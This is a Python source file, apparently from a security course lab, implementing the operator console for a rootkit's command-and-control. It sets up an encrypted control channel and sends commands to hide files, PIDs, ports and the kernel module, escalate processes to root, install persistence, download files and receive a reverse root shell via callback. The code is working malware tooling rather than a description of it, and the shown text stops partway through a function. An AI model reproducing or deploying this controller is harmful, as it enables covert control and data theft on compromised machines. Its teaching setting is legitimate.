"""Authenticated control console and target session state."""

from __future__ import annotations

from dataclasses import dataclass
import fcntl
import os
from pathlib import Path
import re
import secrets
import selectors
import socket
import struct
import subprocess
import sys
import termios
import time
import tomllib
import tty
from typing import Callable, TextIO

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console as RichConsole
from rich.table import Table

import lib.operator as _config

KEY_LENGTH = 32
NONCE_LENGTH = 12
TAG_LENGTH = 16
HEADER_LENGTH = 18
FRAME_MAX = 4096
VERSION = 1
REQUEST = 1
REPLY = 2
SEQUENCE_MAX = 0x7FFFFFFF
SHELL_PRELUDE_LENGTH = 31
SHELL_TICKET = re.compile(r"OPEN ([0-9a-f]{8}) ([0-9a-f]{16})")
SHELL_STATUS = re.compile(
    r"STATE ([0-9a-f]{8}) "
    r"(idle|connecting|running|exited|refused|timed-out|failed|stopped) "
    r"(-?[0-9]+)"
)
_CATEGORIES = ("file", "pid", "content", "port")
_PROTOCOL_PATH = Path(__file__).parent / "protocol.toml"

import contextlib
import logging


def _load_protocol(path: Path = _PROTOCOL_PATH) -> dict:
    with open(path, "rb") as f:
        return tomllib.load(f)


def _build_help(proto: dict) -> str:
    groups: dict[str, list[str]] = {}
    for cmd in proto["commands"].values():
        g = cmd["group"]
        groups.setdefault(g, [])
        wire = cmd["wire"]
        # operator-facing: lowercase command words, uppercase arg placeholders
        def _fmt_token(t):
            if t.startswith("<") and t.endswith(">"):
                return t[1:-1].upper()
            if t.startswith("[") and t.endswith("]"):
                return f"[{t[1:-1].upper()}]"
            return t.lower()
        name = " ".join(_fmt_token(t) for t in wire.split())
        groups[g].append(f"  {name:<22}{cmd['help']}")
    groups.setdefault("session", [])
    groups["session"].append(f"  {'help':<22}show this reference")
    order = ["hide", "unhide", "operate", "recon", "view", "list", "session"]
    lines = []
    for g in order:
        if g not in groups:
            continue
        lines.append(g.title())
        lines.extend(groups[g])
        lines.append("")
    return "\n".join(lines).rstrip()


def _build_completions(proto: dict) -> dict:
    comps: dict = {}
    for cmd in proto["commands"].values():
        parts = re.split(r"[<\[]", cmd["wire"])[0].strip().lower().split()
        if len(parts) == 1:
            comps.setdefault(parts[0], None)
        elif len(parts) == 2:
            if not isinstance(comps.get(parts[0]), dict):
                comps[parts[0]] = {}
            comps[parts[0]][parts[1]] = None
    comps["help"] = None
    comps["quit"] = None
    return comps


_PROTOCOL = _load_protocol()
PROTOCOL_VERSION = _PROTOCOL["protocol"]["version"]
COMMAND_HELP = _build_help(_PROTOCOL)
_OPERATOR_COMPLETIONS = _build_completions(_PROTOCOL)
_ERROR_TABLE = {int(k): v for k, v in _PROTOCOL["errors"].items()}

_nullctx = contextlib.nullcontext
log = logging.getLogger("operator")


def protocol_error(reply: str) -> str | None:
    """Parse an ERR reply into a human-readable message, or None if not an error."""
    if not reply.startswith("ERR "):
        return None
    try:
        code = int(reply.split()[1])
    except (IndexError, ValueError):
        return reply
    return _ERROR_TABLE.get(code, f"unknown error {code}")


class _StdoutHandler(logging.Handler):
    """Handler that always writes to current sys.stdout, not a captured copy."""

    def __init__(self):
        super().__init__()

    def emit(self, record):
        try:
            msg = self.format(record)
            sys.stdout.write(msg + "\n")
            sys.stdout.flush()
        except Exception:
            self.handleError(record)


def setup_logging():
    """Configure the operator logger with a plain-text handler on stdout."""
    if log.handlers:
        return
    handler = _StdoutHandler()
    handler.setFormatter(logging.Formatter("%(message)s"))
    log.addHandler(handler)
    log.setLevel(logging.INFO)




class OperatorConsole:
    """Interactive operator console backed by prompt_toolkit + rich."""

    def __init__(
        self,
        exchange: Callable[[str], str],
        exchange_quiet: Callable[[str], str],
        on_shell: Callable[[str], None],
        shell_port: int = 0,
        receive_reply: Callable[[], bytes] | None = None,
        target=None,
        input_stream: TextIO | None = None,
    ):
        self._exchange = exchange
        self._exchange_quiet = exchange_quiet
        self._on_shell = on_shell
        self._shell_port = shell_port
        self._receive_reply = receive_reply
        self._target = target
        self._input_stream = input_stream
        self._rc = None
        completions = dict(_OPERATOR_COMPLETIONS)
        if target is not None:
            completions["back"] = None
        if input_stream is None:
            self._session = PromptSession(
                completer=NestedCompleter.from_nested_dict(completions),
            )
        else:
            self._session = None
        self.prompt = "operator> "
        self._quit = False

    def _send(self, wire: str) -> str:
        try:
            payload = wire.encode("ascii")
        except UnicodeEncodeError:
            log.warning("commands use ASCII characters only")
            return ""
        if len(payload) > CONTROL_TEXT_MAX:
            log.warning("command is too long (maximum %d bytes)", CONTROL_TEXT_MAX)
            return ""
        return self._exchange(wire)

    def _list_category(self, category: str) -> None:
        count_reply = self._exchange_quiet(f"LIST {category}")
        if not count_reply.startswith("LIST "):
            return
        count = int(count_reply.split()[1])
        if count == 0:
            log.info("  (empty)")
            return
        for i in range(count):
            entry_reply = self._exchange_quiet(f"LIST {category} {i}")
            if entry_reply.startswith("ENTRY "):
                parts = entry_reply.split(None, 2)
                value = parts[2] if len(parts) > 2 else ""
                log.info("  [%d] %s", i, value)

    def do_hide(self, arg: str) -> None:
        parts = arg.strip().split(None, 1)
        if not parts:
            log.warning("usage: hide file|pid|content|port|module VALUE")
            return
        sub = parts[0].lower()
        if sub == "module":
            self._send("HIDE MODULE")
            return
        if sub in _CATEGORIES and len(parts) == 2:
            self._send(f"HIDE {sub.upper()} {parts[1]}")
            return
        log.warning("usage: hide file|pid|content|port VALUE")

    def do_unhide(self, arg: str) -> None:
        parts = arg.strip().split()
        if not parts:
            log.warning("usage: unhide file|pid|content|port N | unhide all | unhide module")
            return
        sub = parts[0].lower()
        if sub == "all":
            self._send("UNHIDE ALL")
            return
        if sub == "module":
            self._send("UNHIDE MODULE")
            return
        if sub in _CATEGORIES and len(parts) == 2 and parts[1].isdigit():
            self._send(f"UNHIDE {sub.upper()} {parts[1]}")
            return
        log.warning("usage: unhide file|pid|content|port N")

    def do_list(self, arg: str) -> None:
        cat = arg.strip().lower()
        if not cat:
            for c in _CATEGORIES:
                log.info("%s:", c)
                self._list_category(c.upper())
            return
        if cat in _CATEGORIES:
            log.info("%s:", cat)
            self._list_category(cat.upper())
            return
        log.warning("usage: list [file|pid|content|port]")

    def do_status(self, arg: str) -> None:
        reply = self._exchange_quiet("STATUS")
        if not reply.startswith("STATUS "):
            return
        table = Table(show_header=False, box=None, padding=(0, 2))
        table.add_column(style="bold")
        table.add_column()
        for pair in reply[7:].split():
            if "=" in pair:
                k, v = pair.split("=", 1)
                table.add_row(k, v)
        self._rc.print(table)

    def do_escalate(self, arg: str) -> None:
        pid = arg.strip()
        if not pid or not pid.isdigit():
            log.warning("usage: escalate PID")
            return
        self._send(f"ESCALATE {pid}")

    def do_persist(self, arg: str) -> None:
        self._send("PERSIST")

    def do_unpersist(self, arg: str) -> None:
        self._send("UNPERSIST")

    def do_ps(self, arg: str) -> None:
        idx = arg.strip()
        self._send(f"PS {idx}" if idx else "PS")

    def do_ports(self, arg: str) -> None:
        idx = arg.strip()
        self._send(f"PORTS {idx}" if idx else "PORTS")

    def do_download(self, arg: str) -> None:
        remote_path = arg.strip()
        if not remote_path:
            log.warning("usage: download PATH")
            return
        if self._target:
            log.info("download  %s", remote_path)
            try:
                def on_progress(received, total):
                    pct = received * 100 // total if total else 100
                    log.info("  %d/%d (%d%%)", received, total, pct)
                data, total = self._target.download_file(remote_path, on_progress)
            except Exception as e:
                log.warning("  %s", e)
                return
            _save_download(remote_path, data)
        elif self._receive_reply:
            log.info("download  %s", remote_path)
            reply = self._exchange_quiet(f"DOWNLOAD {remote_path}")
            err = protocol_error(reply)
            if err:
                log.warning("  %s", err)
                return
            if not reply.startswith("FILE "):
                log.warning("  unexpected: %s", reply)
                return
            total = int(reply.split()[1])
            log.info("  size: %d bytes", total)
            chunks = []
            received = 0
            while True:
                raw = self._receive_reply()
                if raw == b"EOF":
                    break
                chunks.append(raw)
                received += len(raw)
            pct = received * 100 // total if total else 100
            log.info("  %d/%d (%d%%)", received, total, pct)
            _save_download(remote_path, b"".join(chunks))
        else:
            log.warning("download not available in this console")

    def do_shell(self, arg: str) -> None:
        sub = arg.strip().lower()
        if sub == "status":
            self._send("SHELL STATUS")
            return
        reply = self._send(f"SHELL {self._shell_port}")
        if reply and reply.startswith("OPEN "):
            self._on_shell(reply)

    def do_info(self, arg: str) -> None:
        reply = self._exchange_quiet("INFO")
        if not reply.startswith("INFO "):
            return
        parts = reply[5:].split(None, 2)
        if len(parts) >= 3:
            table = Table(show_header=False, box=None, padding=(0, 2))
            table.add_column(style="bold")
            table.add_column()
            table.add_row("hostname", parts[0])
            table.add_row("kernel", parts[1])
            table.add_row("arch", parts[2])
            self._rc.print(table)
        else:
            log.info("  %s", reply[5:])

    def do_back(self, arg: str) -> bool:
        return True

    def do_quit(self, arg: str) -> bool:
        self._quit = True
        return True

    def do_help(self, arg: str) -> None:
        log.info("%s", COMMAND_HELP.rstrip())
        if self._target is not None:
            log.info("  back                return to server view")

    def _read_line(self) -> str | None:
        if self._input_stream is not None:
            line = self._input_stream.readline()
            return line if line else None
        try:
            return self._session.prompt(self.prompt)
        except EOFError:
            return None
        except KeyboardInterrupt:
            return ""

    def run(self) -> None:
        ctx = patch_stdout(raw=True) if self._session else _nullctx()
        with ctx:
            self._rc = RichConsole(highlight=False)
            while True:
                line = self._read_line()
                if line is None:
                    self._quit = True
                    break
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 1)
                cmd_name = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                handler = getattr(self, f"do_{cmd_name}", None)
                if handler:
                    if handler(arg):
                        break
                else:
                    log.warning("unknown command: %s; type help", line)
                if self._target and not self._target.online:
                    log.warning("%s went offline", self._target.id)
                    break

    # ponytail: legacy alias for callers that still say cmdloop
    cmdloop = run


def _save_download(remote_path, data):
    dest = Path("downloads") / remote_path.lstrip("/")
    dest.parent.mkdir(parents=True, exist_ok=True)
    try:
        dest.write_bytes(data)
        log.info("  saved %d bytes to %s", len(data), dest)
    except OSError as e:
        log.warning("  write failed: %s", e)
CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
SESSION_FILES = frozenset((
    "control.key", "control.sock", "operator.ready", "ports.held",
    "session.toml", "shell.sock",
))


class OperatorError(RuntimeError):
    """The target session or its authenticated operator failed."""


def _nonce(session: int, sequence: int, kind: int) -> bytes:
    if not 0 < session < 1 << 64:
        raise OperatorError("session must be a nonzero 64-bit integer")
    if not 0 < sequence <= SEQUENCE_MAX or kind not in (REQUEST, REPLY):
        raise OperatorError("invalid secure-envelope sequence or direction")
    counter = (sequence << 1) | (kind == REPLY)
    return struct.pack(">QI", session, counter)


class OpenSslAead:
    """AES-256-GCM adapter backed by the course's OpenSSL helper."""

    def __init__(
        self,
        key: bytes,
        helper: Path,
        output: Callable[[str], None],
    ):
        if len(key) != KEY_LENGTH:
            raise OperatorError("control key must contain exactly 32 bytes")
        self._key = key
        self._helper = helper
        self._output = output

    def close(self) -> None:
        self._key = bytes(KEY_LENGTH)

    def _run(
        self,
        operation: str,
        nonce: bytes,
        aad: bytes,
        payload: bytes,
    ) -> bytes:
        if len(nonce) != NONCE_LENGTH:
            raise OperatorError("AES-GCM nonce must contain exactly 12 bytes")
        if len(aad) > 0xFFFF or len(payload) > 0xFFFF:
            raise OperatorError("AES-GCM input exceeds the helper limit")
        request = b"".join((
            self._key,
            nonce,
            struct.pack(">HH", len(aad), len(payload)),
            aad,
            payload,
        ))
        command = [self._helper, operation]
        result = subprocess.run(
            command,
            input=request,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        if result.stderr:
            self._output(result.stderr.decode(errors="replace"))
        if result.returncode:
            detail = result.stderr.decode(errors="replace").strip()
            raise OperatorError(detail or "OpenSSL AES-GCM operation failed")
        return result.stdout

    def seal(self, nonce: bytes, aad: bytes, plaintext: bytes) -> bytes:
        sealed = self._run("seal", nonce, aad, plaintext)
        if len(sealed) != len(plaintext) + TAG_LENGTH:
            raise OperatorError("OpenSSL AES-GCM returned a truncated result")
        return sealed

    def open(self, nonce: bytes, aad: bytes, sealed: bytes) -> bytes:
        if len(sealed) < TAG_LENGTH:
            raise OperatorError("authenticated payload is shorter than its tag")
        plaintext = self._run("open", nonce, aad, sealed)
        if len(plaintext) != len(sealed) - TAG_LENGTH:
            raise OperatorError("OpenSSL AES-GCM returned a truncated result")
        return plaintext


class SecureControl:
    """One authenticated control connection negotiated by a HELLO frame."""

    def __init__(self, key: bytes, aead_factory):
        self._aead = aead_factory(key)
        self.session = 0
        self.next_request = 1
        self.next_reply = 1

    def close(self) -> None:
        self._aead.close()

    @staticmethod
    def _header(kind: int, session: int, sequence: int) -> bytes:
        return struct.pack(">BBQQ", VERSION, kind, session, sequence)

    @staticmethod
    def _parts(
        envelope: bytes,
    ) -> tuple[bytes, int, int, int, int, bytes]:
        if not HEADER_LENGTH + TAG_LENGTH <= len(envelope) <= FRAME_MAX:
            raise OperatorError("secure envelope has an invalid length")
        header = envelope[:HEADER_LENGTH]
        version, kind, session, sequence = struct.unpack(">BBQQ", header)
        return (
            header,
            version,
            kind,
            session,
            sequence,
            envelope[HEADER_LENGTH:],
        )

    def accept_hello(self, envelope: bytes) -> int:
        header, version, kind, session, sequence, sealed = self._parts(envelope)
        if version != VERSION or kind != REPLY or sequence != 1 or not session:
            raise OperatorError("invalid HELLO envelope header")
        plaintext = self._aead.open(
            _nonce(session, sequence, kind),
            header,
            sealed,
        )
        if not plaintext.startswith(b"HELLO "):
            raise OperatorError("authenticated first message is not HELLO")
        parts = plaintext.split()
        if len(parts) < 2:
            raise OperatorError("HELLO missing protocol version")
        remote_version = int(parts[1])
        if remote_version != PROTOCOL_VERSION:
            raise OperatorError(
                f"protocol version mismatch: "
                f"agent={remote_version} operator={PROTOCOL_VERSION}"
            )
        self.session = session
        self.next_reply = 2
        return session

    def seal_request(self, plaintext: bytes) -> bytes:
        if not self.session:
            raise OperatorError("HELLO has not been authenticated")
        if len(plaintext) > FRAME_MAX - HEADER_LENGTH - TAG_LENGTH:
            raise OperatorError("control command is too long")
        if self.next_request > SEQUENCE_MAX:
            raise OperatorError("control request sequence is exhausted")
        sequence = self.next_request
        header = self._header(REQUEST, self.session, sequence)
        sealed = self._aead.seal(
            _nonce(self.session, sequence, REQUEST),
            header,
            plaintext,
        )
        self.next_request += 1
        return header + sealed

    def open_reply(self, envelope: bytes) -> bytes:
        if not self.session:
            raise OperatorError("HELLO has not been authenticated")
        if self.next_reply > SEQUENCE_MAX:
            raise OperatorError("control reply sequence is exhausted")
        header, version, kind, session, sequence, sealed = self._parts(envelope)
        if (
            version != VERSION
            or kind != REPLY
            or session != self.session
            or sequence != self.next_reply
        ):
            raise OperatorError("unexpected authenticated reply header")
        plaintext = self._aead.open(
            _nonce(session, sequence, kind),
            header,
            sealed,
        )
        self.next_reply += 1
        return plaintext


def _receive_exact(peer: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        chunk = peer.recv(length - len(chunks))
        if not chunk:
            raise OperatorError("control connection closed mid-frame")
        chunks.extend(chunk)
    return bytes(chunks)


def receive_frame(peer: socket.socket) -> bytes:
    length = struct.unpack(">H", _receive_exact(peer, 2))[0]
    if not 1 <= length <= FRAME_MAX:
        raise OperatorError("control frame has an invalid length")
    return _receive_exact(peer, length)


def send_frame(peer: socket.socket, payload: bytes) -> None:
    if not 1 <= len(payload) <= FRAME_MAX:
        raise OperatorError("control frame has an invalid length")
    peer.sendall(struct.pack(">H", len(payload)) + payload)


def _listener(port: int = 0) -> socket.socket:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind(("127.0.0.1", port))
        listener.listen(4)
    except OSError:
        listener.close()
        raise
    return listener


def _new_key() -> bytes:
    key = bytes(KEY_LENGTH)
    while not any(key):
        key = secrets.token_bytes(KEY_LENGTH)
    return key


def _available_port(exclude: int = 0) -> int:
    while True:
        listener = _listener()
        port = int(listener.getsockname()[1])
        listener.close()
        if port != exclude:
            return port


def _process_start(pid: int) -> int | None:
    if pid <= 0:
        return None
    try:
        fields = Path(f"/proc/{pid}/stat").read_text(encoding="ascii")
        return int(fields.rsplit(")", 1)[1].split()[19])
    except (OSError, UnicodeError, ValueError, IndexError):
        return None


@dataclass(frozen=True)
class TargetSession:
    """Private connection state shared by the target and operator CLIs."""

    directory: Path
    label: str
    target_pid: int
    target_start: int
    control_port: int
    shell_port: int
    key: bytes

    @property
    def key_file(self) -> Path:
        return self.directory / "control.key"

    @property
    def ready_file(self) -> Path:
        return self.directory / "operator.ready"

    @property
    def held_file(self) -> Path:
        return self.directory / "ports.held"

    @property
    def control_sock(self) -> Path:
        return self.directory / "control.sock"

    @property
    def shell_sock(self) -> Path:
        return self.directory / "shell.sock"

    def close(self) -> None:
        for name in SESSION_FILES:
            path = self.directory / name
            if path.exists() and not path.is_symlink() and path.is_file():
                path.unlink()
        try:
            self.directory.rmdir()
        except FileNotFoundError:
            pass
        except OSError as error:
            raise OperatorError(
                f"could not clean target session: {self.directory}"
            ) from error


def _remove_stale_session(directory: Path) -> None:
    if not directory.exists():
        return
    for path in directory.iterdir():
        path.unlink()
    directory.rmdir()


def _write_session_file(path: Path, content: str) -> None:
    path.write_text(content, encoding="ascii")
    path.chmod(0o600)


def create_target_session(
    root: Path,
    label: str,
) -> TargetSession:
    """Create one private run directory for a foreground target."""
    run_root = root / _config.state_dir / "run"
    run_root.mkdir(parents=True, exist_ok=True, mode=0o700)
    directory = run_root / label
    if directory.exists():
        try:
            previous = read_target_session(root, label)
        except OperatorError:
            previous = None
        if previous is not None:
            n = 2
            while (run_root / f"{label}-{n}").exists():
                n += 1
            directory = run_root / f"{label}-{n}"
        else:
            _remove_stale_session(directory)
    directory.mkdir(mode=0o700)
    key = _new_key()
    control_port = _available_port()
    shell_port = _available_port(control_port)
    target_pid = os.getpid()
    target_start = _process_start(target_pid)
    if target_start is None:
        raise OperatorError("could not identify the target process")
    session = TargetSession(
        directory, label, target_pid, target_start,
        control_port, shell_port, key,
    )
    try:
        _write_session_file(session.key_file, key.hex() + "\n")
        _write_session_file(directory / "session.toml", (
            "schema_version = 1\n"
            f'label = "{label}"\n'
            f"target_pid = {target_pid}\n"
            f"target_start = {target_start}\n"
            f"control_port = {control_port}\n"
            f"shell_port = {shell_port}\n"
        ))
    except BaseException:
        session.close()
        raise
    return session


def read_target_session(
    root: Path,
    label: str,
) -> TargetSession:
    """Load the private state for a running target."""
    directory = root / _config.state_dir / "run" / label
    if not directory.is_dir():
        raise OperatorError(
            f"target {label} is not running; start it in another terminal"
        )
    try:
        metadata = tomllib.loads(
            (directory / "session.toml").read_text(encoding="ascii"))
        key_text = (directory / "control.key").read_text(encoding="ascii")
    except (OSError, tomllib.TOMLDecodeError) as error:
        raise OperatorError("target session state is invalid") from error
    if "exercise" in metadata and "label" not in metadata:
        metadata["label"] = metadata.pop("exercise")
    target_pid = metadata.get("target_pid", 0)
    target_start = metadata.get("target_start", 0)
    control_port = metadata.get("control_port", 0)
    shell_port = metadata.get("shell_port", 0)
    if _process_start(target_pid) != target_start:
        raise OperatorError("target session is no longer active")
    if not re.fullmatch(r"[0-9a-f]{64}\n", key_text):
        raise OperatorError("target session key is invalid")
    key = bytes.fromhex(key_text.strip())
    return TargetSession(
        directory, metadata.get("label", label),
        target_pid, target_start, control_port, shell_port, key,
    )


def hold_ports(target: TargetSession) -> tuple[socket.socket, socket.socket]:
    """Bind stub listeners so QEMU guestfwd can connect at boot."""
    control = _listener(target.control_port)
    try:
        shell = _listener(target.shell_port)
    except BaseException:
        control.close()
        raise
    _write_session_file(target.held_file, "held\n")
    return control, shell


def release_ports(
    stubs: tuple[socket.socket, socket.socket],
    target: TargetSession,
) -> None:
    """Close stub listeners so the operator can re-bind."""
    stubs[0].close()
    stubs[1].close()
    target.held_file.unlink(missing_ok=True)


def wait_for_operator(target: TargetSession) -> None:
    """Wait until the second terminal has bound both callback listeners."""
    while not target.ready_file.exists():
        time.sleep(0.1)


def mark_operator_ready(target: TargetSession) -> None:
    target.ready_file.unlink(missing_ok=True)
    _write_session_file(target.ready_file, "ready\n")


@dataclass
class HostOperator:
    key: bytes
    control_listener: socket.socket
    shell_listener: socket.socket

    @classmethod
    def create(cls) -> "HostOperator":
        return cls(_new_key(), _listener(), _listener())

    @classmethod
    def from_session(cls, session: TargetSession) -> "HostOperator":
        try:
            control = _listener(session.control_port)
            try:
                shell = _listener(session.shell_port)
            except BaseException:
                control.close()
                raise
        except OSError as error:
            raise OperatorError(
                "another operator is already connected to this target"
            ) from error
        return cls(session.key, control, shell)

    @property
    def control_port(self) -> int:
        return int(self.control_listener.getsockname()[1])

    @property
    def shell_port(self) -> int:
        return int(self.shell_listener.getsockname()[1])

    def close(self) -> None:
        self.control_listener.close()
        self.shell_listener.close()


class TargetProcess:
    """Liveness view backed by PID plus Linux start time."""

    def __init__(self, session: TargetSession):
        self._pid = session.target_pid
        self._start = session.target_start
        self.returncode = None

    def poll(self):
        if _process_start(self._pid) == self._start:
            return None
        self.returncode = "stopped"
        return self.returncode


def build_crypto_helper(
    root: Path,
    directory: Path,
    transcript: Callable[[list[object]], None],
    output: Callable[[str], None],
) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    helper = directory / "control-aead"
    source = Path(__file__).parent / "control_aead.c"
    lock_path = directory / "control-aead.lock"
    with lock_path.open("a+b") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        if (
            helper.is_file()
            and not helper.is_symlink()
            and helper.stat().st_mtime_ns >= source.stat().st_mtime_ns
        ):
            return helper
        candidate = directory / ".control-aead.new"
        command = [
            "gcc", "-std=c11", "-Wall", "-Wextra", "-Werror", "-O2",
            "-o", str(candidate), str(source), "-lcrypto",
        ]
        transcript(command)
        result = subprocess.run(
            command,
            cwd=root,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            check=False,
        )
        if result.stdout:
            output(result.stdout)
        if result.returncode:
            candidate.unlink(missing_ok=True)
            raise OperatorError(
                "could not build control crypto; run make doctor"
            )
        os.replace(candidate, helper)
    return helper


def accept_while_running(
    listener: socket.socket,
    process,
    timeout: float = 0,
) -> socket.socket:
    sel = selectors.DefaultSelector()
    sel.register(listener, selectors.EVENT_READ)
    deadline = (time.monotonic() + timeout) if timeout > 0 else 0
    try:
        while True:
            if process.poll() is not None:
                raise OperatorError(
                    f"target stopped before connecting"
                    f" ({process.returncode})"
                )
            if deadline:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise OperatorError(
                        "timed out waiting for the target callback"
                    )
            else:
                remaining = 1.0
            if sel.select(timeout=remaining):
                peer, _ = listener.accept()
                return peer
    finally:
        sel.unregister(listener)
        sel.close()


def parse_shell_ticket(reply: str) -> tuple[int, int]:
    match = SHELL_TICKET.fullmatch(reply)
    if match is None:
        raise OperatorError("shell request returned an invalid ticket")
    request_id = int(match.group(1), 16)
    cookie = int(match.group(2), 16)
    if not request_id or not cookie:
        raise OperatorError("shell request returned an invalid ticket")
    return request_id, cookie


def encode_control_command(command: str) -> bytes:
    try:
        payload = command.encode("ascii")
    except UnicodeEncodeError as error:
        raise OperatorError("commands use ASCII characters only") from error
    if len(payload) > CONTROL_TEXT_MAX:
        raise OperatorError(
            f"command is too long (maximum {CONTROL_TEXT_MAX} ASCII bytes)"
        )
    return payload



def poll_shell_status(
    request_id: int,
    exchange: Callable[[str], str],
    pause: Callable[[float], None] = time.sleep,
) -> str:
    for _ in range(100):
        reply = exchange("SHELL STATUS")
        match = SHELL_STATUS.fullmatch(reply)
        if match is None or int(match.group(1), 16) != request_id:
            raise OperatorError("shell returned an invalid status")
        if match.group(2) not in ("connecting", "running"):
            return reply
        pause(0.05)
    raise OperatorError("shell did not reach a terminal state")


def accept_shell_while_running(
    listener: socket.socket,
    process,
    request_id: int,
    cookie: int,
    timeout: float,
    warning: Callable[[str], None],
) -> socket.socket:
    expected = f"RKSH {request_id:08x} {cookie:016x}\n".encode("ascii")
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        shell = None
        remaining = deadline - time.monotonic()
        try:
            shell = accept_while_running(
                listener,
                process,
                remaining,
            )
        except OperatorError:
            raise
        try:
            shell.settimeout(min(2.0, remaining))
            prelude = _receive_exact(shell, SHELL_PRELUDE_LENGTH)
        except (OSError, OperatorError):
            if shell is not None:
                shell.close()
            continue
        if secrets.compare_digest(prelude, expected):
            shell.settimeout(None)
            return shell
        warning("Rejected a shell connection with the wrong ticket")
        shell.close()
    raise OperatorError("timed out waiting for the requested root shell")


def run_control_console(
    root: Path,
    target: TargetSession,
    *,
    transcript: Callable[[list[object]], None],
    input_stream: TextIO | None = None,
    **_kwargs,
) -> int:
    """Operate one running target over its real authenticated callbacks."""
    setup_logging()
    input_stream = input_stream or sys.stdin
    operator = HostOperator.from_session(target)
    process = TargetProcess(target)
    peer = None
    secure = None
    try:
        log.info("listen  control  127.0.0.1:%d", operator.control_port)
        log.info("listen  shell    127.0.0.1:%d", operator.shell_port)
        log.info("wait    control  target callback")
        helper = build_crypto_helper(
            root,
            root / _config.state_dir / "tools",
            transcript,
            lambda msg: log.debug("%s", msg.rstrip()),
        )
        mark_operator_ready(target)
        log.info("ready   target   callback listeners bound")
        peer = accept_while_running(
            operator.control_listener,
            process,
            90,
        )
        peer.settimeout(30)
        log.info("accept  control  target callback")
        secure = SecureControl(
            operator.key,
            lambda key: OpenSslAead(
                key, helper, lambda msg: log.debug("%s", msg.rstrip()),
            ),
        )
        session = secure.accept_hello(receive_frame(peer))
        log.info("verify  HELLO    session=%016x", session)
        log.info("Type help to list commands. Tab completes.")

        def exchange_quiet(command: str) -> str:
            payload = encode_control_command(command)
            send_frame(peer, secure.seal_request(payload))
            return secure.open_reply(receive_frame(peer)).decode(
                "ascii",
                errors="replace",
            )

        def handle_shell(reply: str) -> None:
            request_id, cookie = parse_shell_ticket(reply)
            log.info("wait    shell    target callback")
            shell = accept_shell_while_running(
                operator.shell_listener,
                process,
                request_id,
                cookie,
                30,
                lambda msg: log.warning("%s", msg),
            )
            log.info("recv    RKSH %08x %016x", request_id, cookie)
            log.info("verify  ticket   matched")
            log.info("Remote root Bash. Type exit to return.")
            with shell:
                relay_shell(shell, input_stream, lambda msg: sys.stdout.write(msg))
            log.info("Remote Bash closed.")

        def recv_reply() -> bytes:
            return secure.open_reply(receive_frame(peer))

        def exchange(command: str) -> str:
            log.info("send    %s", command)
            reply = exchange_quiet(command)
            err = protocol_error(reply)
            if err:
                log.warning("error   %s", err)
            else:
                log.info("recv    %s", reply)
            return reply

        console = OperatorConsole(
            exchange, exchange_quiet, handle_shell,
            shell_port=operator.shell_port,
            receive_reply=recv_reply,
            input_stream=input_stream if input_stream is not sys.stdin else None,
        )
        console.run()
        if console._quit:
            try:
                send_frame(peer, secure.seal_request(b"QUIT"))
            except Exception:
                pass
        return 0
    except KeyboardInterrupt as error:
        raise OperatorError("control console interrupted") from error
    except (OSError, OperatorError, UnicodeError) as error:
        raise OperatorError(str(error)) from error
    finally:
        if secure is not None:
            secure.close()
        if peer is not None:
            peer.close()
        operator.close()
        target.ready_file.unlink(missing_ok=True)


def relay_shell(
    shell: socket.socket,
    input_stream: TextIO,
    output: Callable[[str], None],
) -> None:
    """Relay a remote PTY, using local raw mode when stdin is a terminal."""
    selector = selectors.DefaultSelector()
    selector.register(shell, selectors.EVENT_READ, "shell")
    input_fd = None
    close_pending = False
    input_line = bytearray()
    saved_terminal = None
    try:
        input_fd = input_stream.fileno()
        if os.isatty(input_fd):
            saved_terminal = termios.tcgetattr(input_fd)
            tty.setraw(input_fd)
        selector.register(input_fd, selectors.EVENT_READ, "input")
    except (AttributeError, ValueError, OSError, termios.error):
        input_fd = None
        try:
            selector.register(input_stream, selectors.EVENT_READ, "input")
        except (ValueError, OSError):
            shell.shutdown(socket.SHUT_WR)
    try:
        while selector.get_map():
            for key, _ in selector.select():
                if key.data == "shell":
                    data = shell.recv(4096)
                    if not data:
                        selector.unregister(shell)
                        return
                    output(data.decode(errors="replace"))
                    if close_pending:
                        shell.shutdown(socket.SHUT_WR)
                        close_pending = False
                elif input_fd is not None:
                    data = os.read(input_fd, 4096)
                    if not data:
                        selector.unregister(input_fd)
                        shell.shutdown(socket.SHUT_WR)
                    else:
                        forwarded, close_input = _shell_input(data, input_line)
                        if forwarded:
                            shell.sendall(forwarded)
                        if close_input:
                            selector.unregister(input_fd)
                            if forwarded:
                                close_pending = True
                            else:
                                shell.shutdown(socket.SHUT_WR)
                else:
                    line = input_stream.readline()
                    if not line:
                        selector.unregister(input_stream)
                        shell.shutdown(socket.SHUT_WR)
                    else:
                        data = line.encode()
                        forwarded, close_input = _shell_input(
                            data,
                            input_line,
                        )
                        if forwarded:
                            shell.sendall(forwarded)
                        if close_input:
                            selector.unregister(input_stream)
                            if forwarded:
                                close_pending = True
                            else:
                                shell.shutdown(socket.SHUT_WR)
    finally:
        if saved_terminal is not None and input_fd is not None:
            termios.tcsetattr(input_fd, termios.TCSADRAIN, saved_terminal)
        selector.close()


def _shell_input(data: bytes, line: bytearray) -> tuple[bytes, bool]:
    """Forward terminal bytes and recognize an explicit local shell exit."""
    forwarded = bytearray()
    close_input = False
    for byte in data:
        if byte == 4:
            # The remote process owns a PTY.  Forward VEOF so its line
            # discipline, not the TCP stream, gives Bash terminal EOF.
            forwarded.append(byte)
            close_input = not line
            line.clear()
            continue
        forwarded.append(byte)
        if byte in (10, 13):
            command = bytes(line).strip()
            if command in (b"exit", b"logout") or command.startswith(b"exit "):
                close_input = True
            line.clear()
        elif len(line) < 256:
            line.append(byte)
        else:
